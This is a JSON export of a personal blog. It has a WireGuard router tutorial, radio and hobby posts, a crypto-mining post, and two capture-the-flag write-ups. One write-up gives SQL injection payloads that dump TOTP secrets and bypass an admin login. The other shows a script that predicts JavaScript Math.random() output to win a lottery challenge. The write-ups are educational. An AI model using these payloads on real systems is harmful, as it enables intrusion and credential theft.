[{"content":"Why Wireguard? It\u0026rsquo;s 2020. Age of OpenVPN is over (atleast I hope). It\u0026rsquo;s too bulky and contains a lot of stuff that is not needed. Wireguard is simple, easy-to-setup, and fast.\nThe Problem I have a dedicated server split into multiple VPS that I wanted to make available from my home network (not over the internet, mind you). This is mostly because I can access my server directly without having to expose all the services (SSH, databases, etc) to the public.\nGetting to the point, I had already set-up a wireguard connection between my desktop and the servers. There are plenty of tutorials for this available over the internet so I am not going to cover that here, follow whichever you like. IMO, the default quickstart is enough to set it up.\nBut the thing I want to be able to do is to be able to install wireguard as a client on my wifi router itself, so I can access the server network from my home devices without having to install wireguard in all of them. Tutorials for this weren\u0026rsquo;t really available and hence this post.\nNote: I keep my wireguard interface on 24x7, and I don\u0026rsquo;t want to use my server as a \u0026ldquo;classic VPN\u0026rdquo; for internet. It\u0026rsquo;s solely for connecting me to my servers. If you want to use the server as a \u0026ldquo;normal VPN\u0026rdquo;, you need to set up firewall rules to forward internet traffic server-side and set AllowedIPs to 0.0.0.0/0 client-side.\nNote #2: The disadvantage is that all my home devices (atleast the ones which don\u0026rsquo;t have wireguard) masquerade as a single IP (10.10.100.100.3, see below) and thus if I want to access my home devices from the server (which is not the scope of this post, and frankly, why would you ever do that!?), I have to setup IP forwarding or add all such devices as a wireguard peer.\nMy IPs It gets real confusing if I don\u0026rsquo;t mention which IP is what, so:\n I am using 10.10.10.0/24 subnet for the VPSes1. 10.10.10.1 is the main router and gateway, which handles all networking and is a wireguard peer. The other IPs (10.10.10.2, 10.10.10.3 and so on) are the servers. For the home network, I am using 10.100.100.0/24 subnet, where 10.100.100.1 is set as the wireguard gateway. I am going to use 10.100.100.3 as my router\u0026rsquo;s wireguard IP. My server\u0026rsquo;s public IP that\u0026rsquo;s listening over the internet is x.x.x.x. (You thought I was actually gonna post it? Haha) and for wireguard it listens over the default port (51820).  You can use other local IP subnets2 too but I prefer the 10.0.0.0/8 subnet.\nOpenWRT Configuration Installing packages Install the wireguard package and if you want to set it up over LuCI, install luci-app-wireguard. This post uses LuCI. You can install them either directly from LuCI or SSH into the box and execute:\n1  opkg install wireguard luci-app-wireguard   Configuring wireguard interface Go to Network -\u0026gt; Interfaces on LuCI and click on Add new interface. Select Wireguard VPN as protocol and any name you like.\n        I am using wg0 as interface, not wg1, keep that in mind.    After creation, edit the interface, and in the General Settings tab, copy paste your private key3 into the field, and set your IP address.\n        Ez, right?    Go to Peers tab and Add peer. Add your server\u0026rsquo;s public key, set allowed IPs to whatever local IP range you are using (or 0.0.0.0/0 for entire internet over wireguard), check Route Allowed IPs checkbox, set the endpoint host and port (your server\u0026rsquo;s IP and port) and click Save. Optionally, add a description to identify the peer if you have multiple peers.\n        Haha, still won\u0026rsquo;t give my server\u0026rsquo;s IP    Don\u0026rsquo;t forget to Save \u0026amp; Apply, and restart it if necessary!\nTesting wireguard interface Just SSH into your router and try to ping the VPSes. If you can ping, the interface works. If not\u0026hellip; your config is broken.\nSetting firewall rules If you want to access your serversfrom your home devices and not just from the router, you need some firewall config. Thankfully, LuCI makes firewall config a breeze.\nHead over to Network -\u0026gt; Firewall and add a new zone. Configure the input, output and forward rules however you like, I did Reject for Input and Forward, and Accept for Output. Check the Masquerading checkbox, select both LAN and wg0 (or whatever you named your interface) in Covered Networks and in the Allow forward from source zones, select LAN. Then save it.\n        I have no idea what MSS clamping means, can anyone explain?    Save \u0026amp; Apply it, and you are done! You should be able to access your servers from any device on your router now.\nFooter If you have any questions comment below or contact me and I\u0026rsquo;ll try to help! Although keep in mind I am still learning networking and not very proficient in it.\nI recently found that I was attracted to servers \u0026mdash; I want to install a rack server in my bedroom, sadly it\u0026rsquo;s really hard to build homelabs in India \u0026lsquo;cause of cost :( \u0026mdash; so I\u0026rsquo;ll probably be making more blog posts related to networking in the future!\n Plural form for VPS is VPSes, right? \u0026#x21a9;\u0026#xfe0e;\n Local IP ranges that you should be able to use are 10.0.0.0/8, 172.16.0.0/12 and 192.168.0.0/24. Use an IP calculator if you want to see which IPs are available and too lazy to remember what /24 or /12 means. \u0026#x21a9;\u0026#xfe0e;\n Out of scope for this post cause millions of tutorials exist, go make one now. Literally single line command. \u0026#x21a9;\u0026#xfe0e;\n   ","description":"","id":0,"section":"posts","tags":["wireguard","openwrt","tutorial"],"title":"Wireguard Client on OpenWRT Routers","uri":"https://blog.sohamsen.me/posts/wireguard-client-on-openwrt/"},{"content":"The TL;DR of this challenge was SQL injection and overriding javascript (to skip the encrypt/decrypt functions).\nChallenge Challenge Name: Blog from the future\nChallenge Description:\n My friend Bob likes sockets so much, he made his own blog to talk about them. Can you check it out and make sure that it\u0026rsquo;s secure like he assured me it is?\nLink\n Solution JS Overriding Rule #1 of web CTFs: ALWAYS check robots.txt first! This time I found:\nUser-Agent: * Disallow: /admin And in /admin there is a comment saying you need to use TOTP (Time Based OTP. Who does not use a TOTP for 2-factor authentication in 2020?)\nOkay, so back to the home page. It was using websockets to fetch blog posts. On Inspect-Elementing/View-Sourcing you find main.js which is obfuscated. I just used the default Prettifier in Chrome (the {} button in Sources tab) to deobfuscate it.\nAccording to the Network tab, the packets were encrypted:\nI was going to rewrite the encrypt and decrypt functions in Python but that would\u0026rsquo;ve wasted a lot of time. So I just decided to override JS instead.\nYou have to enable overriding support first in Google Chrome (no idea about Firefox, I don\u0026rsquo;t use it), and here is the official guide.\nThen, you need to right click on the tab (main.js in this case) and you\u0026rsquo;ll see Save for overrides. Press that, and you\u0026rsquo;re ready!\nWhile overriding, console.log() is your friend. Use it everywhere and see what\u0026rsquo;s happening. I saw a function that decrypted the received data and I added my console.log() there:\n1 2  const e = JSON.parse(i.utils.utf8.fromBytes(i.padding.pkcs7.strip(u.decrypt(t)))); console.log(e);   Cool! Now it printed everything! Now, I had to modify the sent requests. Just below the above line, there was:\n1 2 3 4 5 6 7  if (\u0026#34;success\u0026#34; === e) { const t = parseInt(window.location.hash.substr(1)); if (!isNaN(t)) return r.send(o.encode([\u0026#34;getPost\u0026#34;, t])); r.send(o.encode(\u0026#34;listPosts\u0026#34;)) } }   And I found just what I wanted: a method to send data. In this case, it was getting the post ID from the URL, and sending that to get the post. Time for SQL Injection!\nSQL Injection To ensure I could do a SQL Injection attack, I made it:\n1  r.send(o.encode([\u0026#34;getPost\u0026#34;, \u0026#34;1 OR 5=5;--\u0026#34;]));   And yes, it worked! I got all the posts on the site. Output of console.log:\n1 2 3 4 5 6 7 8 9  (3) [\u0026#34;post\u0026#34;, \u0026#34;1 OR 2=2;--\u0026#34;, Array(2)] 0: \u0026#34;post\u0026#34; 1: \u0026#34;1 OR 2=2;--\u0026#34; 2: Array(2) 0: {id: 1, title: \u0026#34;Welcome to the future!\u0026#34;, author: 1, text: \u0026#34;I finally upgraded my blog to use the tech of the …to be truly able to call my blog \u0026#34;futuristic\u0026#34;. :/\u0026#34;, postDate: 1580857200000, …} 1: {id: 2, title: \u0026#34;A review of American sockets\u0026#34;, author: 1, text: \u0026#34;They\u0026#39;re pretty cool, in my opinion.\u0026#34;, postDate: 1580947200000, …} __proto__: Array(0) length: 3 __proto__: Array(0)   Explanation: I assumed the SQL statement was something like SELECT * FROM posts WHERE id=\u0026lt;ID HERE\u0026gt;.\nSo, my input made it: SELECT * FROM posts WHERE id=1 OR 5=5;--. Select everything from table posts where ID is 1 or 5=5 (which evaluates to True), aka fetch all posts. ;-- skips whatever is at the end, and terminates the query.\nAfter that, I used UNION to join another SELECT query to get user information. In UNION, you have to make sure the number of columns match and hence the 1,1 thing:\n1  r.send(o.encode([\u0026#34;getPost\u0026#34;, \u0026#34;1 OR 2=2 UNION SELECT *,1,1,0 from users;--\u0026#34;]));   I didn\u0026rsquo;t find users table or *,1,1,0 on first attempt. It took like 20-30 attempts to get it right.\nFirst I did UNION SELECT 1,1,1,1,1,1 but that didn\u0026rsquo;t work cause the last variable hidden was 1, and it didn\u0026rsquo;t return that. UNION SELECT 1,1,1,1,1,0 returned what was expected.\nThen I tried to get table names from information_schema.tables but that wasn\u0026rsquo;t working. I tried to use some \u0026ldquo;common\u0026rdquo; table names and users worked. Then I did UNION SELECT *,0 from users;--, and kept adding ,1 till it worked. (Remember, UNION means same number of columns)\nHere was the output:\n1 2 3 4 5 6 7 8 9 10 11 12  (3) [\u0026#34;post\u0026#34;, \u0026#34;1 OR 2=2 UNION SELECT *,1,1,0 from users;--\u0026#34;, Array(4)] 0: \u0026#34;post\u0026#34; 1: \u0026#34;1 OR 2=2 UNION SELECT *,1,1,0 from users;--\u0026#34; 2: Array(4) 0: {id: 1, title: \u0026#34;Welcome to the future!\u0026#34;, author: 1, text: \u0026#34;I finally upgraded my blog to use the tech of the …to be truly able to call my blog \u0026#34;futuristic\u0026#34;. :/\u0026#34;, postDate: 1580857200000, …} 1: {id: 1, title: \u0026#34;alice\u0026#34;, author: \u0026#34;J5YD4O2BIZYEMVJYIY3F24S3GQ2VC3ZTKJQVW5JFJUYHKODXORQQ\u0026#34;, text: 1, postDate: 1, …} 2: {id: 2, title: \u0026#34;A review of American sockets\u0026#34;, author: 1, text: \u0026#34;They\u0026#39;re pretty cool, in my opinion.\u0026#34;, postDate: 1580947200000, …} 3: {id: 2, title: \u0026#34;bob\u0026#34;, author: \u0026#34;IE3V2RR4HRLUEOBDLVCWCQTYF5LT6RTCONNDMULGGJGS4STUMYWA\u0026#34;, text: 1, postDate: 1, …} length: 4 __proto__: Array(0) length: 3 __proto__: Array(0)   I took the TOTP secret key for bob and plugged it into a TOTP Generator.\nOn the admin page, I Inspect-Elemented, and uncommented the TOTP input field and deleted password field. After entering the username (bob) and the generated TOTP, I was able to log in and get the flag.\nFlag is: rtcp{WebSock3t5_4r3_SQLi_vu1n3r4b1e_t00_bacfe0}. GGWP.\nConclusion It greatly helps SQL injection if you can create a local SQL table on your end and try creating SQL statements that work.\nAnd, it\u0026rsquo;s sometimes far more efficient to override javascript than to manually simulate requests (using curl/python) like many beginners do.\nAsk me in the comments for any issues! And thanks jammy for the challenge!\n","description":"","id":1,"section":"posts","tags":["web-ctf","housecat-rtcp-ctf"],"title":"Overriding JS to Perform SQL Injection (Housecat RTCP CTF Writeup: Blog from the future)","uri":"https://blog.sohamsen.me/posts/overriding-js-sql-injection/"},{"content":"TL;DR? Here.\nPS: You need to do pip install z3-solver requests for this to work.\nOkay so a little confession: Before the CTF challenge, I didn\u0026rsquo;t think much of Cryptographically Secure Pseudo Random Generators (CSPRNGS), and thought they were just for very high security purposes, like defence against a state level hacking agency. I thought normal PRNGs were enough for day-to-day purposes and no one could realistically break it.\nAfter this CTF\u0026hellip;oh boy, it takes 30 mins to break PRNGs (the one used by Javascript in Chrome/Firefox) and I\u0026rsquo;m never going to use those for security again. I should\u0026rsquo;ve never\u0026hellip;\nAnyway, let\u0026rsquo;s get started!\nChallenge Challenge Name: JS Lotto\nChallenge Description:\n I found this lotto website called JS Lotto. Wanna test your luck? I heard if you guess all 5 numbers correctly, you can win a flag!\nLink\n So, there was this challenge where you had to enter 5 numbers between 1 to 1000 and the server would match these numbers with 5 randomly generated ones. It was sending a POST request:\n1 2 3 4 5  POST http://challs.houseplant.riceteacatpanda.wtf:30006/guess Content-Type: application/json Data: [1,2,3,4,5] Returns: {\u0026#34;results\u0026#34;:[858.7939810434016,511.14241319962207,251.7950653388974,371.5915221535004,262.29409707684704]}   Solution After a bit of fiddling, I realized I had to break the random number generator and predict the numbers in future to win this challenge. From the name (JS Lotto) I guessed the backend was in JavaScript and Math.random() was being used (cause this won\u0026rsquo;t be a break-random() anymore if a CSPRNG was being used).\nAfter a bit of googling, I came to know XORShift128+ is used in JavaScript for generating random numbers. And it can be broken by a high-schooler. Which I am. Lucky.\nI came across XorShift128Plus predictor Python code on Github which had the code for Google Chrome and Firefox based JS engines. (Safari is there too but broken).\nSo first I got 2 random numbers from the site using CURL (1 for using as a generation seed and one for validation):\n1 2 3  $ curl \u0026#39;http://challs.houseplant.riceteacatpanda.wtf:30006/guess\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; --data \u0026#39;[2,2,2,2,2]\u0026#39; \u0026amp; curl \u0026#39;http://challs.houseplant.riceteacatpanda.wtf:30006/guess\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; --data \u0026#39;[2,2,2,2,2]\u0026#39; {\u0026#34;results\u0026#34;:[858.7939810434016,511.14241319962207,251.7950653388974,371.5915221535004,262.29409707684704]}{\u0026#34;results\u0026#34;:[862.676114246725,526.9341585672347,396.08207314621023,634.2906066568407,603.2069164482145]}   The original code required the numbers to be in 0-1 range so I divided all numbers by 1000:\n1 2 3  dubs = [858.7939810434016,511.14241319962207,251.7950653388974,371.5915221535004,262.29409707684704] dubs = [i/1000 for i in dubs] validation_numbers = [862.676114246725,526.9341585672347,396.08207314621023,634.2906066568407,603.2069164482145]   It worked with the default browser config (Chrome) but there was another issue in the code, that the first generated number (862.676114246725 in this case) was getting skipped. It was relatively easy to fix, on line 189, changed generated = [] to:\n1  generated = [to_double(browser, state0 \u0026amp; MASK)]   After it\u0026rsquo;s generated, I had to remultiply the numbers by 1000 by using:\n1  generated = [i*1000 for i in generated]   Now, I did some print statements to check if validation numbers were in generated, and voila! It worked.\n1 2 3  print(generated) print([i in generated for i in validation_numbers]) # prints True if the number is in generated, else False. 5 True means everything is working!   Now I had to just add in requests and automate it, and print the flag. It was relatively simple:\n1 2 3 4 5 6 7 8 9  dubs = requests.post( \u0026#34;http://challs.houseplant.riceteacatpanda.wtf:30006/guess\u0026#34;, json=[1,2,3,4,5]).json()[\u0026#39;results\u0026#39;] ... # After generation is done # Had to send integers z = requests.post( \u0026#34;http://challs.houseplant.riceteacatpanda.wtf:30006/guess\u0026#34;, json=[int(i) for i in generated[:5]]).json() print(z)   Flag is: rtcp{th3_h0us3_d1dnt_w1n_th15_t1m3_5bcbf4}. GGWP.\nConclusion Note: It may not always work since the requests have to be consecutive. A fast internet will greatly help.\nHere is the full code on GitHub Gist. Ask me in the comments for any issues!\nIt was a fun challenge and it made me realize: NEVER use non-cryptographically secure PRNGs for ANYTHING related to security. Thanks jammy for the challenge!\n","description":"","id":2,"section":"posts","tags":["miscellaneous-ctf","housecat-rtcp-ctf"],"title":"Breaking Math.random() and Predicting Random Numbers (Housecat RTCP CTF Writeup: JS Lotto)","uri":"https://blog.sohamsen.me/posts/breaking-math-random/"},{"content":"I recently got my hands on a RTL-SDR (I’m currently using NooElec SmarTEE), short for Software Defined Radio. Basically a tool which lets you hook up your PC to an external antenna, in layman’s term.\nAnd oh boy, the things you can do with it is beyond words, literally. Radio waves are not sent with words\u0026hellip; Bad joke. Sorry.\nFirst, I did what everyone does at the beginning: FM Radio. Then Air Traffic Control. Then more random gibberish. And then finally, NOAA 19 weather satellite!\n NOAA 19: An old weather satellite that has some cool cameras that enables anyone with a SDR to get low quality realtime pictures of Earth.\nhttps://en.wikipedia.org/wiki/NOAA-19\n First Attempt: Complete Failure For reasons I can’t explain myself, I decided it would be worth a try to see if I can receive the signals with the default monopole antenna (a simple straight antenna) that shipped with my SDR. As you can expect, or guess with common sense what should happen when you use an ordinary antenna to receive a weak signal from 700km away, I did not receive the slightest bit of a signal.\nResult: FAIL. The most basic component, the antenna itself was wrong.\nSecond Attempt: Mostly Failure After lots of research, I found out that there are mainly 3 types of antenna that can be used to receive the NOAA signal. Those are the Quadrifilar Helix Antenna (QFH for short, looks like two DNA strands mixed together), the Turnstile antenna (four metal rods at 90deg angles), and the easiest V-Dipole antenna (two metal rods in a V-shape, 120deg between them). If you want to read more about these, here is the link.\nNOTE: You can also use a directional antenna like a yagi, if you have the patience to point it towards the satellite for 14 minutes. Or you cam build a tracker. Directional scanners have a lot of gain. Yagi has, on average, 10-12 dB of gain which is equivalent to a 1000% to 1500% increase in reception power. Yes.\nI wanted to build a QFH antenna as it had the best reception quality, but could not source all raw materials. After a lot of thinking, I bought off the RTL-SDR V-Dipole Antenna kit which came with a tripod for ease-of-mounting.\nI happily waited for the next satellite pass, and went on the roof, excited to get my first satellite pictures.\nThe good part? I detected the satellite signal. The bad part? The satellite signal was too low for a proper conversion to image.\nResult: FAIL. The satellite was at a very low elevation (25 degree), which meant that the signals were blocked by other buildings and the satellite itself was a lot further away.\nThird Attempt: Partial Success To my surprise, the very next day had a good NOAA 19 pass at an elevation of 65 degrees. I went to the roof 30 minutes before the pass and set up my equipment. This is how it looked:\n        My laptop, my headphones, the SDR, and the dipole antenna.    …And it worked! After days, even weeks, of waiting, I got my first proper view of India through the NOAA 19 telescope. Here is the image:\n        Beautiful, innit?    Full of static in edges, but the beautiful sea looks like bliss\nResult: PARTIAL SUCCESS. I got a picture, but the quality was lower than I expected. Could be much more improved.\nFuture Attempts Here is a list of lessons I learnt:\n Don’t experiment with antennas unless you have a lot of free time, and V-Dipoles are cheap and easy, but not the best. V-Dipole antennas have a 2 dB, or roughly 63% power loss because the signal polarity does not match. For a good reception, maximum elevation must be a minimum of 50-60 degrees. Any less and you will get a very weak signal with lots of static. r/RTLSDR is a very friendly and nice subreddit that helped me find my mistakes and correct them. Kudos to them.  For my future attempts, I have some ideas that I want to test:\n A pass that has a maximum elevation above 85 degrees. My LNA (Low-Noise Amplifier. A tool to amplify the signal strength without increasing the background static/noise. Basically, magic.) which I recently bought (an LNA4ALL). Have not yet tested it for satellites, but listened to Air Traffic Control and it magically boosted the signal. 10/10 would recommend. A handheld yagi antenna for better signal reception. Basically I have to hold this antenna in my hand for 14 minutes, while moving it slowly such that it points towards the satellite. A tedious job. Or at the very least, I want to use a QFH.  In the future, I am going to expand from NOAA to Meteor to other satellites that others don’t commonly use.\nThere are about five thousand active satellites as of now. Some of those have an unencrypted downlink that allows people with SDRs and good antennas to receive their signals. Sadly, many require a directional antenna\u0026hellip; and I don\u0026rsquo;t have enough money to buy one. (Well, the shipping costs. The dish itself is cheap, but shipping is nearly 1k$. Big sad.) Donations welcome!\n","description":"","id":3,"section":"posts","tags":["radio","satellite","noaa"],"title":"Listening to NOAA 19 With RTL-SDR","uri":"https://blog.sohamsen.me/posts/listening-to-noaa-19/"},{"content":"Yes, this name is a rip off of Evangelion 3.0+1.0. No, unlike Eva 4.0, this post is not imaginary. Atleast as of April 2020. Eva 4.0 was supposed to release in June 2020 but corona :( Probably will get delayed to 2120.\nWhy is this 4.0? How many blogs existed before?! Who killed them!? Side Note: ?! or !? is called the interrobang. Small things you learn everyday.\nI killed them. Now, before I get jailed or lynched, let me prove my innocence.\nThe first blog I made was written using a custom markdown-to-static-using-python I made and \u0026hellip; well I learnt pretty quickly that reinventing the wheel is 9/10 times a bad idea. So I killed it. I migrated it\u0026rsquo;s contents to blog 2.0, though. Also, I made a theme myself (yay?) based on EBMFW. Not a PG-13 website, but a quite nice theme.\nThe second blog was written in Jekyll. Much better, even GitHub recommends that! I don\u0026rsquo;t have to handle all the small nuiances myself, and there are thousands of themes for it! All was good, but then things suddenly took a bad turn\u0026hellip; and this is where things started to get dark. I have no idea why I killed it. Honestly. In my defence, I was probably possessed by a ghost. Or got hit by a truck and didn\u0026rsquo;t get isekai-ed. And in that state of madness, I committed one of the worst sins ever\u0026hellip;\nI created the third blog, 3.0, with Joomla\u0026hellip;not. Just kidding, I\u0026rsquo;d have killed myself too if I consciously made a Joomla site. As you can probably guess at this point, it was a Wordpress site. Why? I still have no idea, but here\u0026rsquo;s an excerpt from that blog:\n So, you might ask, why do the same thing three times? Answer is … I don’t know. I felt it was better using WordPress instead of writing a custom CMS (as in first attempt) or waste life in writing Markdown (as in second attempt, which worked on Jekyll).\n See? I have absolutely no idea why I used Wordpress.\n        A cute kitten to bring down your anger level.    In this, my fourth and probably final attempt, I have undertaken a spiritual journey to get rid of the sin of calling Markdown as waste of life. Please forgive me. I know I cannot be forgiven for this, but still, please try. Oh, and if you try to come murder me, just take the lift (elevator for you American folks), and don\u0026rsquo;t glide in through the window. That\u0026rsquo;s \u0026hellip; quite annoying.\nI will port the (( good )) content of my previous blogs here.\nThis looks cool! What are you using? Like all cultured men, I am using Hugo with Zzo Theme. One word: Daamn, this is the best! Okay, 5 words. But honestly, it even got a gallery! And ability to do presentations! And showcases! And publications! And FIVE THEMES AS OF NOW. Seriously, this is an awesome theme. Get it. 11/10 would recommend.\nWhat\u0026rsquo;s the purpose of this blog? To atone for my sin of saying Markdown is waste of life.\nNo specific purpose. I plan on writing about my hobbies, ranging from electronics, radio transmission/receiving, astronomy/astrophotography, tech stuff, maybe even programming. And I\u0026rsquo;ll also post pics I take or draw in the gallery. It\u0026rsquo;s free for all to use, just give me an attribution and I\u0026rsquo;d be super happy :)\n","description":"","id":4,"section":"posts","tags":["miscellaneous","helloworld"],"title":"Hello World 3.0+1.0","uri":"https://blog.sohamsen.me/posts/hello-world/"},{"content":"All images here were taken by me, either using remote satellites, or telescopes, or my own 8\u0026rdquo; Dobsonian.\n","description":"","id":5,"section":"gallery","tags":[""],"title":"Earth N Space","uri":"https://blog.sohamsen.me/gallery/earth-n-space/"},{"content":"Stuff I drew. Sadly, I don\u0026rsquo;t get time nowadays to draw more :( Will resume later in 2020.\n","description":"","id":6,"section":"gallery","tags":[""],"title":"Anime","uri":"https://blog.sohamsen.me/gallery/anime/"},{"content":"2020 Update: I left mining\u0026hellip;5 days after writing this blog post (I wrote this back in 2018).\nI earnt ~10 TZC, which, as of 2020 April, is approximately 0.01379 USD. Yes, value went down. Yes, a huge income.\nCurrent thoughts: If you can have cheap electricity and cheap hardware (both of which I don\u0026rsquo;t have), go mine!\nWe all know that we cannot mine Bitcoins with a PC now, anymore, atleast until you don\u0026rsquo;t want to have something like this —\n        New product: Heater that looks like a computer!    However, BTC is not the only available crypto coin. There are thousands.\nAnd not all of them are equivalent to thousands of USD. The coin I am currently mining, as of writing, is about 0.4$ per coin (TrezarCoin, more on this below). Many are currently in a stage similar to BitCoin\u0026rsquo;s early days, that is in layman terms, still mineable on a low/middle end PC. That is mainly cause dedicated ASICs are not yet available for them.\nI\u0026rsquo;m currently experimenting with mining on my HP laptop, with a 5th gen Intel i5, and NVIDIA GeForce GT 940M (Not even a gaming GPU). And the results so far are not bad. Earnt 2 TZC (approx $0.8 at time of writing) in 18 hours.\nQ — What the hell is TZC? TreZarCoin. The crypto coin I am currently mining. 1 TZC = $0.4 for now.\n\u0026hellip;and how is mining $0.8 a day profitable? The number one reason I would say is that, it is an investment. Who knows, even TZC might skyrocket to thousands of USD in the future, just as BitCoin did. In its early days, BitCoin too amounted to a very low amount of USD.\n        How BTC was in its childhood    I cannot gurantee you will earn profit at the current rates though: It depends on the mining rig setup (efficiency of hardware), and the cost of electricity. My setup takes low power (it is a laptop after all), and electricity is quite cheap here.\nQ — Where/What/When/How do you mine?  Where — I mine with my laptop on either Linux or Windows depending on what I am using. Duh. What — I mine TrezarCoin. It was introduced in late 2017. When — I generally keep mining on my laptop 24x7, except when I am playing games or running software upgrades. And really, running a laptop 24x7 does NOT destroy it. I have been doing this (and other stuff which require always-on PC setups) for years on a HP laptop. Although I recommend plugging it in to a charger and removing the battery. How — I recommend you read one of the countless mining tutorials available on the net. I am currently using the official TrezarCoin mining pool, which has a nice \u0026ldquo;Getting Started\u0026rdquo;.  Q — How do I get started? We all have different PCs (a mid range laptop in my case). Different initial investments (0 in my case). Different power prices (IDK what\u0026rsquo;s exactly the price here). We only have a common intention: to mine.\nEnough with the weird talk. If you want to start, I suggest you head over to WhatToMine.com. Enter the GPU your computer has (you can approximate, as I did), and other stuff like cost of electricity, power consumption, etc. Then you will get a nice table of cryptocurrencies you can mine. I recommend doing a bit of homework, aka, researching on the crypto coin: How good is the market, What is the expected outcome of the price of the coin in the future, etc. Again, any questions, just ask me.\nI have some questions for you now:\n How was this post? How much will you rate this between 0 to 10 (0 - Go-die and 10 - I-will-save-this-and-ensure-this-survives-even-if-Earth-is-destroyed)? Should I add advertisements? (Jk) What do you want the next blog to be about? Should I enable a newsletter for the blogs?  じゃあね (See ya)!\n","description":"","id":7,"section":"posts","tags":["cryptocurrency","bitcoin"],"title":"Mining Crypto-Currencies in 2018 with a PC GPU (or laptop)","uri":"https://blog.sohamsen.me/posts/mine-crypto-with-laptop/"}]